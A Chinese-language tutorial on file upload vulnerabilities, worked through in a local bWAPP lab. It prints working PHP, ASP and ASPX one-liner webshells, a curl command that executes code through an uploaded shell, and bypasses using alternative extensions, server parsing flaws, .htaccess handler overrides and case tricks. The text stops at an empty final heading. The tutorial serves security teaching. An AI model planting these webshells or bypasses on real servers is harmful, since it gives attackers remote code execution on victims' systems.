#
#### 什么是文件上传漏洞
文件上传漏洞是开发者没有做充足验证情况下，允许用户上传恶意文件(木马，病毒，恶意脚本或WebShell等)。  


#### 实验环境
bwapp  
```
sudo docker run -d -p 8002:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
```
首次需要初始化访问  
```
http://127.0.0.1:8002/install.php
```
安装完后新建一个用户以供后续实验使用  

![](/web-security/img/upload_file1.png)


#### 文件上传初体验  
登陆bwapp并选择文件上传(Unrestricted File Upload / low)  

创建木马文件并上传  
```
# shell.php

<?php @eval($_POST['hacker']); ?>
```
众所周之eval是个危险的函数，会将接受的字符串当做代码执行。  


![](/web-security/img/upload_file2.png)
由于没有上传管理，所以成功php这种危险的文件。后点击`here`会得知`http://127.0.0.1:8002/images/shell.php`文件被上传到了images文件目录下，并可以直接访问。  


php有很多获取信息的函数，比如`get_current_user()`, `getcwd()`等  
因此可以通过hacker参数来执行php代码  
```
shan@shan-GV62-8RC:~/下载/test$ curl -d "hacker=echo get_current_user();"  http://127.0.0.1:8002/images/shell.php
www-data  # 成功回显当前用户
shan@shan-GV62-8RC:~/下载/test$ 
```
如果所有都要靠api是很麻烦的事，所以可以通过几年前比较有名的 中国菜刀 来让一句话木马做不同的功能。  


其他语言的一句话木马  
```
asp   <%eval request ("pass")%>
aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

&emsp;
#### 后缀名绕过
这次使用(Unrestricted File Upload / medium)  

直接上传shell.php  

![](/web-security/img/upload_file3.png)

可以看到已经不被允许了  

重命名之前的shell.php为shell.php3再次上传，会发现上传成功，并能通过api调用。   

**绕过原理**  
如果改为shell.php30则不行，通过apache配置文件可以找到原因。  
进入容器，找到apache语言解析里的配置  
```
shan@shan-GV62-8RC:~/下载/test$ sudo docker exec -it 0ad6cabb9350 /bin/bash
  
root@0ad6cabb9350:/# cat /etc/apache2/mods-enabled/php5.conf 
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
# 
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_flag engine Off
    </Directory>
</IfModule>
```
可以看到 它把 php3、php4、php5、pht、phptml、phps都会解析成php  


#### 服务器中间件漏洞导致的绕过
**IIS5.x/6.0解析漏洞**  
目录解析漏洞：在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么在这些目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行  

文件名解析漏洞：分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp  


**Nginx解析漏洞**  
在低版本nginx中存在一个由PHP-CGI导致的文件解析漏洞  
PHP配置中一个关键选项cgi.fix_pathinfo在本机中位于php.ini配置文件中默认是开启的  
当url中有不存在的文件时会向前解析  
也就是`www.xx.com/phpinfo.jpg/1.php`中`1.php`不存在。就会解析phpinfo.jpg文件，但是按照php格式解析。  
在IIS中开启了Fast-CGI开启状态下也存在这个解析漏洞  


**Apache解析漏洞**  
在apache1.x和2.x版本存在该解析漏洞  
apache从右至左开始判断后缀，跳过不可识别的后缀，直到能识别的后缀在进行解析  
因此如果上传shell.php.test并访问，服务器会解析为shell.php  



#### 前端验证绕过，htaccess绕过，大小写绕过
**前端验证绕过**  
这个很简单，很多网站只在前端验证，所以只需要直接通过后端api上传就行。  

**htaccess绕过**  
htaccess文件是apache服务器中的一个配置文件。它负责相关目录下的网页配置。它可以实现重定向，改变文件扩展名，允许/阻止特定用户的访问等功能  

其中.htaccess文件内容为`SetHandler application/x-httpd-php .test`会设置当前目录所有test后缀文件都使用php解析(只要文件中内容符合php语言规范，就会被当作php执行)  

apache中通过在http.conf中设置AllowOerride启动.htaccess  

![](/web-security/img/upload_file4.png)

如果先上传这样一个.htaccess文件  
再把之前的shell.php改成shell.test上传成功执行。  


**大小写绕过**
这是一种比较简单的绕过方式，是针对黑名单过滤  
如果想要上传一个php木马，那么上传一个pHp即可


#### 文件流绕过，字符串截断绕过，文件头检测绕过

